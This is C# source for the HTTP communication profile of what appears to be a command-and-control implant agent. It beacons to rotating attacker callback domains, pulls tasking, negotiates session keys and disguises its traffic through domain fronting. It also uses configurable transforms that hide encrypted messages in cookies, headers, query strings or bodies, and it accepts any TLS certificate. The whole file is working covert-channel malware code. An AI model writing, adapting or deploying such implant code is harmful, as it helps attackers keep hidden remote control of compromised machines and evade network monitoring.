using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Net;
using System.Text.Json;
using System.Net.Security;
using System.Text;
using HttpxTransform;
using System.Security.Cryptography;

namespace Agent.Profiles
{
    public class HttpxProfile : IProfile
    {
        public IAgentConfig agentConfig { get; set; }
        public ICryptoManager crypt { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private string[] callbackDomains { get; set; }
        private string domainRotation { get; set; }
        private int failoverThreshold { get; set; }
        private int currentDomainIndex = 0;
        private int failureCount = 0;
        private Random random = new Random();
        private HttpxConfig config { get; set; }
        private HttpClient _client { get; set; }
        private int timeoutSeconds;
        private string proxyHost { get; set; }
        private int proxyPort { get; set; }
        private string proxyUser { get; set; }
        private string proxyPass { get; set; }
        private string domainFront { get; set; }
        private int currentAttempt = 0;
        private int maxAttempts = 10;
        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
        public event EventHandler<TaskingReceivedArgs>? SetTaskingReceived;
        
        // EKE (Encrypted Key Exchange) fields
        private bool _uuidNegotiated = false;
        private RSAKeyPair? rsa = null;

        public HttpxProfile(IAgentConfig agentConfig, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
        {
            Console.WriteLine("[HTTPX DEBUG] Constructor called");
            this.agentConfig = agentConfig;
            this.crypt = crypto;
            this.logger = logger;
            this.messageManager = messageManager;
            
            // Parse parameters from config
            this.callbackDomains = %CALLBACK_DOMAINS%;
            this.domainRotation = "%DOMAIN_ROTATION%";
            this.failoverThreshold = %FAILOVER_THRESHOLD%;
            this.timeoutSeconds = %TIMEOUT%;
            this.proxyHost = "%PROXY_HOST%";
            this.proxyPort = %PROXY_PORT%;
            this.proxyUser = "%PROXY_USER%";
            this.proxyPass = "%PROXY_PASS%";
            this.domainFront = "%DOMAIN_FRONT%";
            
            // Load malleable profile configuration
            string rawConfig = decodeBase64Config("%RAW_C2_CONFIG%");
            if (!string.IsNullOrEmpty(rawConfig))
            {
                this.config = HttpxConfig.FromJson(rawConfig);
                this.config.Validate();
            }
            else
            {
                throw new InvalidOperationException("raw_c2_config is required for httpx profile. Please provide a valid JSON or TOML configuration file.");
            }
            
            // Setup HttpClient
            HttpClientHandler handler = new HttpClientHandler();
            ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
            
            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyPort > 0)
            {
                WebProxy wp = new WebProxy()
                {
                    Address = new Uri($"http://{this.proxyHost}:{this.proxyPort}")
                };
                
                if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
                {
                    handler.DefaultProxyCredentials = new NetworkCredential(this.proxyUser, this.proxyPass);
                }
                handler.Proxy = wp;
            }
            
            this._client = new HttpClient(handler);
            this._client.Timeout = TimeSpan.FromSeconds(timeoutSeconds);
            
            if (!string.IsNullOrEmpty(this.domainFront))
            {
                this._client.DefaultRequestHeaders.Host = this.domainFront;
            }
            
            Console.WriteLine("[HTTPX DEBUG] Constructor complete - config loaded successfully");
            Console.WriteLine($"[HTTPX DEBUG] _uuidNegotiated = {_uuidNegotiated}");
        }
        
        private string decodeBase64Config(string configData)
        {
            if (string.IsNullOrEmpty(configData)) return "";
            
            try
            {
                byte[] data = Convert.FromBase64String(configData);
                return System.Text.Encoding.UTF8.GetString(data);
            }
            catch
            {
                return configData; // Not base64, use as-is
            }
        }
        
        private string getCurrentDomain()
        {
            if (callbackDomains == null || callbackDomains.Length == 0)
            {
                return "https://example.com:443"; // Default fallback
            }
            
            switch (domainRotation.ToLower())
            {
                case "round-robin":
                    currentDomainIndex = (currentDomainIndex + 1) % callbackDomains.Length;
                    return callbackDomains[currentDomainIndex];
                    
                case "random":
                    return callbackDomains[random.Next(callbackDomains.Length)];
                    
                case "fail-over":
                default:
                    return callbackDomains[currentDomainIndex];
            }
        }
        
        private void handleDomainFailure()
        {
            failureCount++;
            if (failureCount >= failoverThreshold)
            {
                currentDomainIndex = (currentDomainIndex + 1) % callbackDomains.Length;
                failureCount = 0;
            }
        }
        
        private void handleDomainSuccess()
        {
            failureCount = 0;
        }

        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            Console.WriteLine("[HTTPX DEBUG] Checkin() called");
            Console.WriteLine($"[HTTPX DEBUG] _uuidNegotiated = {_uuidNegotiated}");
            Console.WriteLine($"[HTTPX DEBUG] Current UUID = {this.agentConfig.uuid}");
            Console.WriteLine($"[HTTPX DEBUG] Checking if EKE needed: !_uuidNegotiated = {!_uuidNegotiated}");
            
            // EKE Handshake - MANDATORY for Httpx profile
            if (!_uuidNegotiated)
            {
                Console.WriteLine("[HTTPX DEBUG] Entering EKE handshake flow");
                
                // Generate 4096-bit RSA keypair
                rsa = new RSAKeyPair(4096);
                Console.WriteLine($"[HTTPX DEBUG] RSA keypair generated, SessionId = {rsa.SessionId}");
                Console.WriteLine($"[HTTPX DEBUG] Public key length = {rsa.PublicKey.Length}");
                
                // Create EKE handshake message
                EKEHandshake handshake = new EKEHandshake
                {
                    action = "staging_rsa",
                    pub_key = rsa.PublicKey,
                    session_id = rsa.SessionId
                };
                
                // Send handshake
                string handshakeJson = JsonSerializer.Serialize(handshake, EKEHandshakeJsonContext.Default.EKEHandshake);
                Console.WriteLine($"[HTTPX DEBUG] EKE handshake JSON created, length = {handshakeJson.Length}");
                Console.WriteLine($"[HTTPX DEBUG] Handshake JSON: {handshakeJson.Substring(0, Math.Min(200, handshakeJson.Length))}...");
                Console.WriteLine("[HTTPX DEBUG] Calling Send() for EKE handshake...");
                
                string handshakeResponse = await this.Send(handshakeJson);
                Console.WriteLine($"[HTTPX DEBUG] Send() returned, response length = {handshakeResponse?.Length ?? 0}");
                Console.WriteLine($"[HTTPX DEBUG] Response: {handshakeResponse?.Substring(0, Math.Min(200, handshakeResponse?.Length ?? 0))}...");
                
                if (!string.IsNullOrEmpty(handshakeResponse))
                {
                    EKEHandshakeResponse ekeResp = JsonSerializer.Deserialize(handshakeResponse, EKEHandshakeResponseJsonContext.Default.EKEHandshakeResponse);
                    
                    if (ekeResp != null && !string.IsNullOrEmpty(ekeResp.session_key))
                    {
                        Console.WriteLine("[HTTPX DEBUG] Session key decrypted successfully");
                        Console.WriteLine($"[HTTPX DEBUG] New UUID from server: {ekeResp.uuid}");
                        Console.WriteLine("[HTTPX DEBUG] Updating crypto manager...");
                        
                        // Decrypt the session key using our RSA private key
                        byte[] encryptedKey = Convert.FromBase64String(ekeResp.session_key);
                        byte[] sessionKey = rsa.RSA.Decrypt(encryptedKey, true);
                        
                        // Update crypto manager with new session key and UUID
                        this.crypt.UpdateKey(Convert.ToBase64String(sessionKey));
                        this.crypt.UpdateUUID(ekeResp.uuid);
                        this.agentConfig.uuid = ekeResp.uuid;
                        
                        _uuidNegotiated = true;
                        Console.WriteLine("[HTTPX DEBUG] Crypto manager updated, _uuidNegotiated = true");
                    }
                    else
                    {
                        Console.WriteLine("[HTTPX DEBUG] EKE handshake FAILED - returning failed status (no session_key)");
                        return new CheckinResponse() { status = "failed" };
                    }
                }
                else
                {
                    Console.WriteLine("[HTTPX DEBUG] EKE handshake FAILED - returning failed status (empty response)");
                    return new CheckinResponse() { status = "failed" };
                }
            }
            
            // Now send actual checkin
            int maxAttempts = 3;
            int currentAttempt = 0;
            do
            {
                string res = await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));

                if (!string.IsNullOrEmpty(res))
                {
                    return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
                }
                currentAttempt++;
            } while (currentAttempt <= maxAttempts);

            return new CheckinResponse()
            {
                status = "failed"
            };
        }

        public async Task StartBeacon()
        {
            this.cancellationTokenSource = new CancellationTokenSource();
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000);
                try
                {
                    string responseString = await this.Send(messageManager.GetAgentResponseString());

                    if (String.IsNullOrEmpty(responseString))
                    {
                        this.currentAttempt++;
                        continue;
                    }

                    GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                    if (gtr == null)
                    {
                        this.currentAttempt++;
                        continue;
                    }

                    this.currentAttempt = 0;

                    TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);

                    this.SetTaskingReceived(null, tra);
                }
                catch (Exception e)
                {
                    this.currentAttempt++;
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cancellationTokenSource.Cancel();
                }
            }
        }
        
        internal async Task<string> Send(string json)
        {
            try
            {
                Console.WriteLine($"[HTTPX DEBUG] Send() called, json length = {json.Length}");
                Console.WriteLine($"[HTTPX DEBUG] JSON (first 100 chars): {json.Substring(0, Math.Min(100, json.Length))}...");
                
                // Encrypt the message
                json = this.crypt.Encrypt(json);
                Console.WriteLine($"[HTTPX DEBUG] After encryption, json length = {json.Length}");
                
                byte[] messageBytes = Encoding.UTF8.GetBytes(json);

                // Select HTTP method variation based on message size
                VariationConfig variation = null;
                if (messageBytes.Length > 500)
                {
                    variation = config.GetVariation("post") ?? config.GetVariation("put") ?? config.GetVariation("patch");
                    if (variation == null || string.IsNullOrEmpty(variation.Verb) || variation.Uris == null || variation.Uris.Count == 0)
                    {
                        variation = config.GetVariation("get");
                    }
                }
                else
                {
                    variation = config.GetVariation("get") ?? config.GetVariation("head") ?? config.GetVariation("options");
                    if (variation == null || string.IsNullOrEmpty(variation.Verb) || variation.Uris == null || variation.Uris.Count == 0)
                    {
                        variation = config.GetVariation("post");
                    }
                }
                
                Console.WriteLine($"[HTTPX DEBUG] Selected HTTP method: {variation.Verb}, message size: {messageBytes.Length}");

                // Apply client transforms
                byte[] transformedData = TransformChain.ApplyClientTransforms(messageBytes, variation.Client.Transforms);
                Console.WriteLine($"[HTTPX DEBUG] After transforms, data length = {transformedData.Length}");

                // Build URL
                string domain = getCurrentDomain();
                string uri = variation.Uris[random.Next(variation.Uris.Count)];
                string url = domain + uri;
                Console.WriteLine($"[HTTPX DEBUG] Sending {variation.Verb} request to: {url}");
                Console.WriteLine($"[HTTPX DEBUG] Message location: {variation.Client.Message.Location}");

                // Handle message placement
                string queryParam = "";
                byte[] requestBodyBytes = null;
                
                switch (variation.Client.Message.Location.ToLower())
                {
                    case "query":
                        if (variation.Client.Parameters != null)
                        {
                            foreach (var param in variation.Client.Parameters)
                            {
                                if (!string.IsNullOrEmpty(queryParam))
                                queryParam += "&";
                                queryParam += $"{param.Key}={Uri.EscapeDataString(param.Value)}";
                            }
                        }
                        if (!string.IsNullOrEmpty(queryParam))
                            queryParam += "&";
                        
                        // NOTE: transformedData is already URL-safe (base64url/netbios/netbiosu/netbios)
                        // Do NOT apply Uri.EscapeDataString to avoid double-encoding
                        string messageData = Encoding.UTF8.GetString(transformedData);
                        queryParam += $"{variation.Client.Message.Name}={messageData}";
                        url = url.Split('?')[0] + "?" + queryParam;
                        Console.WriteLine($"[HTTPX DEBUG] Query string length: {queryParam.Length}");
                        break;
                        
                    case "body":
                        requestBodyBytes = transformedData;
                        break;
                }

                // Create HTTP request
                HttpRequestMessage request = new HttpRequestMessage(new HttpMethod(variation.Verb), url);
                
                // Track if we need to set Content-Type on the content object
                string contentTypeHeader = null;
                
                // Add headers
                foreach (var header in variation.Client.Headers)
                {
                    // Content-Type and Content-Length must be set on Content, not Headers
                    if (header.Key.ToLower() == "content-type")
                    {
                        contentTypeHeader = header.Value;
                    }
                    else if (header.Key.ToLower() == "content-length")
                    {
                        // Content-Length is automatically set by HttpClient
                        continue;
                    }
                    else
                    {
                        try
                        {
                            request.Headers.Add(header.Key, header.Value);
                        }
                        catch (Exception)
                        {
                            // Some headers can't be set via HttpClient (e.g., restricted headers)
                            // Continue without that header
                        }
                    }
                }
                
                // Handle cookie and header placement
                switch (variation.Client.Message.Location.ToLower())
                {
                    case "cookie":
                        request.Headers.Add("Cookie", $"{variation.Client.Message.Name}={Uri.EscapeDataString(Encoding.UTF8.GetString(transformedData))}");
                        break;

                    case "header":
                        request.Headers.Add(variation.Client.Message.Name, Encoding.UTF8.GetString(transformedData));
                        break;
                }
                
                // Add body if needed
                if (requestBodyBytes != null && requestBodyBytes.Length > 0)
                {
                    var content = new ByteArrayContent(requestBodyBytes);
                    
                    // Set Content-Type on the content object if it was specified
                    if (!string.IsNullOrEmpty(contentTypeHeader))
                    {
                        content.Headers.ContentType = System.Net.Http.Headers.MediaTypeHeaderValue.Parse(contentTypeHeader);
                    }
                    
                    request.Content = content;
                }

                // Send request
                HttpResponseMessage response = await this._client.SendAsync(request, cancellationTokenSource.Token);
                Console.WriteLine($"[HTTPX DEBUG] HTTP response status: {response.StatusCode}");
                
                response.EnsureSuccessStatusCode();

                // Handle success
                handleDomainSuccess();

                // Read response
                byte[] responseBytes = await response.Content.ReadAsByteArrayAsync();
                Console.WriteLine($"[HTTPX DEBUG] Response length: {responseBytes.Length}");
                
                // Apply server transforms (reverse)
                byte[] untransformedData = TransformChain.ApplyServerTransforms(responseBytes, variation.Server.Transforms);
                
                string responseString = Encoding.UTF8.GetString(untransformedData);
                
                // Decrypt
                return this.crypt.Decrypt(responseString);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[HTTPX DEBUG] Send() exception: {ex.GetType().Name}");
                Console.WriteLine($"[HTTPX DEBUG] Exception message: {ex.Message}");
                Console.WriteLine($"[HTTPX DEBUG] Stack trace: {ex.StackTrace}");
                handleDomainFailure();
                return String.Empty;
            }
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();
            return true;
        }
    }
}

